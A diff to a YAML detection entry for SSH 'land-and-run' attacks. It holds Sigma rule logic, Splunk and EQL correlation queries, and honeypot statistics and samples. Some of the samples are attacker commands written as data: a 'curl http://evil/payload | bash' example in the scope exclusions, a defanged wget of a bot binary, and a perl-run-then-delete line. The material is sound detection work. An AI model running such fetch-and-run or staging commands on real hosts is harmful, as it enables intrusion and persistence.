+        selection_interpreter via CommandLine. T05 source is a known
+        gap (BN-04). System noise filters reduce volume significantly.
   - Level: Analyst
     Description: >
-      Hidden (dot-prefixed) or suspiciously named binary execution from
-      staging directories, or cron-launched execution from staging paths.
+      Hidden (dot-prefixed) file execution from staging directories,
+      either direct (binary at /tmp/.) or via interpreter (bash /tmp/.x),
+      or cron-launched execution from staging paths.
     LogSources:
       - Sysmon for Linux Event ID 1
       - auditd execve
     Logic: >
-      Image starts with /tmp/., /dev/shm/., or /var/tmp/. (dot-prefixed);
-      or ParentImage ends with /cron and Image starts with a staging
-      directory. Low false-positive: legitimate software rarely uses hidden
-      files in /tmp.
+      Direct: Image starts with /tmp/., /dev/shm/., or /var/tmp/.
+      Interpreter: a known interpreter with a dot-prefixed staging path
+      in CommandLine. Cron: ParentImage ends with /cron and Image starts
+      with a staging directory. Low false-positive: legitimate software
+      rarely uses hidden files in /tmp.
+    CorrelationNote: >
+      These rules surface candidate events. Correlation of file_land and
+      exec_log by host, staged path, and time window is performed at the
+      hunt workflow level, not within the individual Sigma rules.
     ExpectedFPRate: Low
     UseCase: SOC-deployable alerting on hidden-file execution from staging directories
     SigmaRule: sigma-rules/ssh-land-and-run/analyst.yml
     Validation:
       RuleStatus: Experimental
       State: Lab-validated
+      TestedOn:
+        - Debian 12 (6.1.0-53-cloud-amd64) with auditd + Sysmon for Linux 1.5.3
+        - Rocky Linux 9.8 (5.14.0-687) with auditd + Sysmon for Linux 1.5.3
       Backends:
-        - "auditd (exec_log) on Debian 12 and Rocky 9"
-        - "Sysmon for Linux 1.5.3 on Debian 12 and Rocky 9"
+        - sigma-cli 3.1.0 / pySigma 1.5.1 (sigma check and EQL/Lucene conversion via pySigma-backend-elasticsearch)
       Notes: >
-        Validated 2026-09-28. The Sliver implant at /tmp/.update, the
+        Lab-validated 2026-09-28. The Sliver implant at /tmp/.update, the
         reverse shell at /dev/shm/.cache, and the staging payload at
         /dev/shm/.payload all match the dot-prefix selection. The cron
         persistence writing /tmp/.update to a crontab matches the
-        cron-from-staging selection.
+        cron-from-staging selection. C0XMO /tmp/.cache would also match
+        the dot-prefix selection. The full temporal write-then-execute
+        correlation requires SIEM-specific queries (see RequiredCorrelation).
+
+RequiredCorrelation:
+  InterpreterConsumption:
+    Description: >
+      The Sigma analyst rule (analyst.yml) detects hidden-file execution
+      from staging directories by matching Image or CommandLine paths. It
+      does not join file-creation events to process-creation events — that
+      temporal correlation (a file written, then executed on the same host)
+      requires a backend-specific query. When the staged file is consumed by
+      an interpreter (sh /tmp/w.sh, perl /tmp/solid.pl, python3
+      /dev/shm/loader.py), Image is the interpreter binary (/usr/bin/sh),
+      not the staged path. The staged path appears in CommandLine. Standard
+      Sigma correlation cannot join on a substring of CommandLine, so a
+      backend-specific query is required.
+    BackendQuery: >
+      Join file_event.TargetFilename to process_creation.CommandLine where
+      CommandLine contains the TargetFilename value, the process Image is a
+      shell or scripting interpreter (/bin/sh, /bin/bash, /usr/bin/perl,
+      /usr/bin/python*), and both events share the same host, within 2 hours,
+      with the file event preceding the process event.
+      Example Splunk:
+        index=linux sourcetype=sysmon EventCode=11 TargetFilename="/tmp/*" OR TargetFilename="/var/tmp/*" OR TargetFilename="/dev/shm/*"
+        | rename TargetFilename AS staged_path, _time AS land_time
+        | join Computer, staged_path [search index=linux sourcetype=sysmon EventCode=1 (Image="*/sh" OR Image="*/bash" OR Image="*/perl" OR Image="*/python*") (CommandLine="* /tmp/*" OR CommandLine="* /var/tmp/*" OR CommandLine="* /dev/shm/*") | rex field=CommandLine "(?<staged_path>/(?:tmp|var/tmp|dev/shm)/\S+)" | rename _time AS run_time]
+        | where run_time > land_time AND run_time - land_time < 7200
+      Example Elastic EQL:
+        sequence by host.name with maxspan=2h
+          [file where file.path : ("/tmp/*", "/var/tmp/*", "/dev/shm/*")]
+          [process where process.executable : ("*/sh", "*/bash", "*/perl", "*/python*") and process.command_line : ("* /tmp/*", "* /var/tmp/*", "* /dev/shm/*")]
+    HoneypotEvidence: >
+      On the honeypot, 185 scp-pull sessions ran the staged file through
+      sh (sh out_sh), and 2 sessions ran perl /tmp/solid.pl. Both have
+      Image as the interpreter, not the staged path. The hunt rule catches
+      these individually; this correlation is needed to tie them back to
+      the file-create event.
+
+ScopeExclusions:
+  - "Stdin-only execution: e.g. ssh target 'bash -s' < script.sh or curl http://evil/payload | bash. No file touches disk, so file_land does not fire."
+  - "Memory-only execution: e.g. memfd_create payloads that never write to a filesystem path. No staging directory is used."
+  - "Shell builtins executed via source: the sourced script runs in the current process with no new execve for the script itself. External commands called by the sourced script do generate execve."
+
+HoneypotMethodology:
+  Dataset: >
+    153-day SSH honeypot (2026-04-27 to 2026-09-26 UTC), single sensor,
+    asyncssh-based. Every credential accepted; command transcripts recorded
+    from an emulated shell. No process telemetry — these are command-line
+    transcripts, not endpoint logs. Operator sessions excluded.
+  CountingScript: queries/30_land_and_run.py
+  CountingResults: land_and_run.json
+  EvidencePack: evidence-pack-v2/
+  Denominator: >
+    69,979 sessions with at least one command. 5,224 of these (7.47%) had
+    at least one stage, in-memory, execute, or execute-like event.
+  ClassificationRules: >
+    Each session is classified by text-pattern matching on its command
+    transcript (not by process telemetry). A "stage" is a file write to
+    a shared-writable directory (cat > /tmp/x, wget -O /tmp/x, scp sink).
+    An "execute" is a direct run (./x, /tmp/x), an interpreter invocation
+    (bash /tmp/x, perl /tmp/x), or a cron/systemd reference naming the
+    staged file. chmod alone is not an execute. Stage-to-execute linking
+    requires the normalised filename to match within the same session,
+    with the stage preceding the execute in segment order.
+  KeyFigures:
+    - Figure: '4,703 staged-then-executed sessions'
+      Derivation: >
+        Sessions where a file was written to a staging directory AND the
+        same filename was later executed or referenced in a cron/systemd
+        line within the same session. Breakdown by delivery method:
+        stdin-to-file 4,055; fetch-to-file (wget/curl) 463; scp pull 185.
+      LedgerID: L02
+    - Figure: '5,020 sessions that staged and ran or scheduled'
+      Derivation: >
+        4,703 (staged-then-executed) + 190 (in-memory pipe-to-interpreter)
+        + 124 (staged, never executed in session) + 3 (executed, no
+        observed staging). The 204 "execute-like, nothing new" sessions
+        (RouterOS probes, system binaries, reverse-shell one-liners) are
+        excluded because they run nothing the session staged.
+      LedgerID: L01, L02
+    - Figure: '93.69% wrote to a shared-writable directory'
+      Derivation: '4,703 / 5,020 = 93.69%. Denominator is the 5,020 above.'
+      LedgerID: L02
+    - Figure: '86.22% linked runs were cron-scheduled only'
+      Derivation: '4,055 / 4,703 = 86.22%. These sessions wrote a cron line referencing the staged file but never ran it directly.'
+      LedgerID: L03
+  Limitations:
+    - The honeypot records command text, not syscalls. Classification is by text pattern matching, not process telemetry.
+    - Every login is accepted; failed and abandoned authentications are not recorded.
+    - stdin and scp payload contents are not captured — only the command that wrote them.
+    - Timestamps are emulation-completion times from the fake shell, not kernel event times.
+    - Single sensor, single location — geographic and network diversity is limited.
 
 RawLogs:
   - Type: auditd file_land
@@ -378,6 +539,7 @@ RawLogs:
     Source: chokepoint_evidence_deb12.tar.gz / chokepoint_evidence_rocky9.tar.gz
     Description: "File write to staging directory — the 'land' side of the chokepoint"
     EvidenceBasis: "Real capture from authorized lab exercise, 2026-09-28. Both targets destroyed after evidence collection."
+    SourceURL: https://attack.mitre.org/techniques/T1105/
     MatchedRules:
       - Research
     Sample: |
@@ -388,6 +550,7 @@ RawLogs:
     Source: chokepoint_evidence_deb12.tar.gz / chokepoint_evidence_rocky9.tar.gz
     Description: "Process execution — the 'run' side of the chokepoint"
     EvidenceBasis: "Real capture from authorized lab exercise, 2026-09-28."
+    SourceURL: https://attack.mitre.org/techniques/T1059/004/
     MatchedRules:
       - Hunt
       - Analyst
@@ -399,6 +562,7 @@ RawLogs:
     Source: chokepoint_evidence_deb12.tar.gz / chokepoint_evidence_rocky9.tar.gz
     Description: "Process creation with full command line"
     EvidenceBasis: "Real capture from authorized lab exercise, 2026-09-28."
+    SourceURL: https://attack.mitre.org/techniques/T1059/004/
     MatchedRules:
       - Hunt
       - Analyst
@@ -412,6 +576,7 @@ RawLogs:
     Source: chokepoint_evidence_deb12.tar.gz (journalctl)
     Description: "Marker payloads confirming each delivery/execution variant"
     EvidenceBasis: "Real capture from authorized lab exercise, 2026-09-28. Markers only emitted on deb12."
+    SourceURL: https://attack.mitre.org/techniques/T1105/
     MatchedRules:
       - Research
       - Hunt
@@ -422,76 +587,121 @@ RawLogs:
       Sep 28 04:14:27 deb12 CHOKEPOINT[941]:  marker=T04 land=base64 run=decode+exec
       Sep 28 04:27:27 deb12 CHOKEPOINT[995]:  marker=T05 land=echo_pipe run=source
       Sep 28 04:28:58 deb12 CHOKEPOINT[1069]: marker=T_PY land=python_write run=python_exec
+  - Type: SSH honeypot command transcript (custom asyncssh emulated shell)
+    EventId: command
+    Source: honeypot events table / events.jsonl
+    Description: 'Land: a download to a file in the same request that runs it'
+    EvidenceBasis: 'Real capture from my own honeypot, 2026-04-27 to 2026-09-26 UTC. Emulated shell: nothing was downloaded or run; this is an attempted command. Staging address pseudonymised, URL defanged.'
+    SourceURL: https://attack.mitre.org/techniques/T1105/
+    MatchedRules:
+      - Research
+      - Analyst
+    Sample: |
+      {"event": "command", "session_id": "ae6fc296-6cd7-4590-a316-8721cf8a4e96", "timestamp": "2026-08-10T23:55:06.192970+00:00", "source_ip": "src-3856", "command": "wget hxxp://src-3856:8080/bot.amd64 -O bot", "mitre_tags": [{"id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command and Control"}]}
+  - Type: SSH honeypot command transcript (custom asyncssh emulated shell)
+    EventId: command
+    Source: honeypot events table / events.jsonl (events.id 9422)
+    Description: 'Land over stdin: the cat > "w.sh" part of a chained line; the same session later names w.sh in a cron line'
+    EvidenceBasis: 'Real capture from my own honeypot, 2026-05-06 UTC. The part starts with "then" because the emulated shell split an if/then line on "; ". The defanger renders w.sh as w[.]sh. stdin bytes were not captured. Source IP pseudonymised.'
+    SourceURL: https://attack.mitre.org/techniques/T1053/003/
+    MatchedRules:
+      - Research
+      - Analyst
+    Sample: |
+      {"event": "command", "session_id": "8596ef87-77a4-4b79-afcb-ddc279fe4ace", "timestamp": "2026-05-06T21:57:18.046477+00:00", "source_ip": "src-185", "command": "then cat > \"w[.]sh\"", "mitre_tags": []}
+  - Type: SSH honeypot command transcript (custom asyncssh emulated shell)
+    EventId: command
+    Source: honeypot events table / events.jsonl (events.id 786044)
+    Description: 'Run through an interpreter in a new SSH connection, 3 s after the same source pushed the file with scp -t in another connection'
+    EvidenceBasis: 'Real capture from my own honeypot, 2026-09-08 UTC. The only command event in this session. Source IP pseudonymised.'
+    SourceURL: https://attack.mitre.org/techniques/T1059/004/
+    MatchedRules:
+      - Hunt
+      - Analyst
+    Sample: |
+      {"event": "command", "session_id": "81442679-d87f-4e90-84f1-bf335ea61fbc", "timestamp": "2026-09-08T20:27:04.375327+00:00", "source_ip": "src-5063", "command": "perl /tmp/solid.pl >/dev/null 2>&1;rm -rf /tmp/solid*;uname -a", "mitre_tags": [{"id": "T1082", "name": "System Information Discovery", "tactic": "Discovery"}]}
 
 EmulationScript:
   File: emulation/ssh-land-and-run/emulate.sh
   Language: shell
   AtomicRef: "T1059.004, T1105, T1053.003"
   Description: >
-    Eight test variants with pass/fail tracking. Covers scp→bash, scp→chmod+exec,
-    heredoc→bash, base64→decode+exec, echo pipe→source, python write→python exec,
-    /dev/shm dot-prefix staging, and cron spool write. Each variant writes a
-    benign marker payload, runs it, logs the result, then cleans up. Generates
-    detection telemetry for auditd and Sysmon validation without downloading or
-    executing anything malicious.
+    Stages benign marker payloads to /tmp and /dev/shm via multiple
+    delivery methods, runs them, validates cron spool writes, then
+    cleans up. Generates telemetry only. Not yet run.
   SafetyNotes: >
     Run ONLY in an isolated lab VM. Do NOT run on production hosts. This
     script generates benign telemetry to validate auditd and Sysmon rules.
     All payloads call logger with a CHOKEPOINT_EMULATION tag, then self-clean.
 
-OsintSources:
-  - Platform: GitHub
-    Query: "cat > w.sh crontab @reboot watcher-netai"
-    Notes: Published analyses of the stdin-delivery family seen most often on the honeypot
-    URL: https://github.com/search?q=watcher-netai&type=code
-  - Platform: Shodan
-    Query: "product:OpenSSH port:22"
-    Notes: The exposed-SSH attack surface this chokepoint defends
-    URL: https://www.shodan.io/search?query=product%3AOpenSSH+port%3A22
-
 Intel:
-  - Name: "MITRE ATT&CK: T1059.004 Unix Shell"
-    Tier: primary
-    URL: https://attack.mitre.org/techniques/T1059/004/
-    Description: Direct and interpreter runs of the staged file.
-  - Name: "MITRE ATT&CK: T1105 Ingress Tool Transfer"
+  - Name: 'MITRE ATT&CK: T1105 Ingress Tool Transfer'
     Tier: primary
     URL: https://attack.mitre.org/techniques/T1105/
     Description: Covers every transfer method seen for the land stage.
-  - Name: "MITRE ATT&CK: T1053.003 Cron"
+  - Name: 'MITRE ATT&CK: T1059.004 Unix Shell'
+    Tier: primary
+    URL: https://attack.mitre.org/techniques/T1059/004/
+    Description: Direct and interpreter runs of the staged file.
+  - Name: 'MITRE ATT&CK: T1053.003 Cron'
     Tier: primary
     URL: https://attack.mitre.org/techniques/T1053/003/
-    Description: The deferred launcher used for persistence.
-  - Name: "MITRE ATT&CK: T1021.004 Remote Services: SSH"
+    Description: The deferred launcher used by 4,055 of the 4,703 staged-then-executed sessions.
+  - Name: 'Fortinet: C0XMO/Gafgyt Cloud Targeting'
+    Tier: supporting
+    URL: https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo
+    Description: Primary threat narrative. SSH brute force staging to /tmp/.cache with cron persistence.
+  - Name: 'Intezer: Rocke Group Cloud Targeting'
+    Tier: supporting
+    URL: https://intezer.com/blog/cloud-security/rocke-group-actively-targeting-the-cloud-wants-your-ssh-keys/
+    Description: Cryptominer staged to /var/tmp with cron and systemd persistence.
+  - Name: 'Google Cloud: Defending vSphere from UNC3944'
+    Tier: supporting
+    URL: https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944/
+    Description: SCP staging to /tmp on ESXi hosts with nohup delayed execution.
+  - Name: 'MITRE ATT&CK: T1021.004 Remote Services: SSH'
     Tier: supporting
     URL: https://attack.mitre.org/techniques/T1021/004/
     Description: Lateral movement validated — same chokepoint fires on internal pivot.
-  - Name: "MITRE ATT&CK: T1572 Protocol Tunneling"
+  - Name: 'MITRE ATT&CK: T1572 Protocol Tunneling'
     Tier: supporting
     URL: https://attack.mitre.org/techniques/T1572/
     Description: >
       C2 tunneled through SSH reverse port forwards. Network-layer detection
       saw nothing; host-layer chokepoint still fired.
-  - Name: "Detection Chokepoints: BYOSI Scripting Interpreters"
+  - Name: 'Detection Chokepoints: BYOSI Scripting Interpreters'
     Tier: supporting
     URL: https://iimp0ster.github.io/detection-chokepoints/chokepoints/byosi-scripting-interpreters/
-    Description: Closest existing entry — same land-then-run shape but Windows-only detections.
+    Description: The closest existing entry, which has the same land-then-run shape but Windows-only detections.
+
+OsintSources:
+  - Platform: GitHub
+    Query: 'cat > w.sh crontab @reboot watcher-netai'
+    Notes: Look for published analyses of the stdin-delivery family seen most often on the honeypot
+    URL: https://github.com/search?q=watcher-netai&type=code
+  - Platform: Shodan
+    Query: 'product:OpenSSH port:22'
+    Notes: The exposed-SSH attack surface this candidate defends
+    URL: https://www.shodan.io/search?query=product%3AOpenSSH+port%3A22
 
 PreventionSummary: >
-  Remove the SSH access that delivers the code, and make the staging
+  Remove the access that delivers the code, and make the staging
   directories unusable for execution. Egress filtering alone does not help
-  because the attacker tunneled all C2 through SSH reverse forwards — the
-  firewall never saw outbound traffic.
+  when the attacker tunnels C2 through the access channel — the
+  firewall never sees outbound traffic.
 PreventionOpportunities:
-  - Category: Identity
-    Control: Key-based SSH authentication only; disable password login on internet-facing hosts
-    Impact: Removes the credential-based access path
   - Category: Endpoint
     Control: Mount /tmp, /var/tmp and /dev/shm with noexec
-    Impact: Blocks direct runs from those paths; interpreter runs (sh /tmp/w.sh) still work
+    Impact: Blocks direct execution from those paths; interpreter consumption (sh /tmp/w.sh) still works, so pair with the hunt rule
+  - Category: Identity
+    Control: Key-based SSH authentication only; disable password login on internet-facing hosts
+    Impact: Removes the credential-guessing delivery path used by C0XMO, Rocke, and every honeypot session
   - Category: Endpoint
-    Control: Restrict or alert on crontab and systemd user-unit changes by SSH sessions
-    Impact: Removes or exposes the deferred launcher used for persistence
+    Control: Restrict or alert on crontab and systemd user-unit changes by non-administrative processes
+    Impact: Removes or exposes the deferred launcher used by 86.22% of linked honeypot runs and by C0XMO and Rocke in the wild
+  - Category: Network
+    Control: Egress filtering for download utilities (wget, curl, tftp) to known-bad or uncategorised destinations
+    Impact: Blocks the fetch-to-file delivery variant (463 honeypot sessions, Rocke, C0XMO). Does not block stdin-to-file or scp delivery.
 
 RelatedChokepoints:
   - byosi-scripting-interpreters
